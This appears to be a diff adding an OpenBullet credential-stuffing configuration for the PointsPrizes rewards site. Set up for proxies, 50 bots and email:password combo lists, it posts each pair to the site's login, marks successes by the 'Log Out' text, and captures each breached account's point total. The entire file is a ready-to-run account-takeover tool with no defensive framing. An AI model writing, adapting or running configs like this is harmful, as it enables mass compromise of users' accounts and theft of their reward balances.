@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "PointsPrizes",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-09T22:35:24.2171905+02:00",
+  "AdditionalInfo": "Capture Total points",
+  "Author": "Aruz",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.pointsprizes.com/account" 
+  CONTENT "password=<PASS>&email=<USER>&transactional=0&newsletter=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Password Incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+
+PARSE "<SOURCE>" LR "class=\"account-points-total\">" "</strong>" -> CAP "Total points" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Total points>" EqualTo "0" 
+
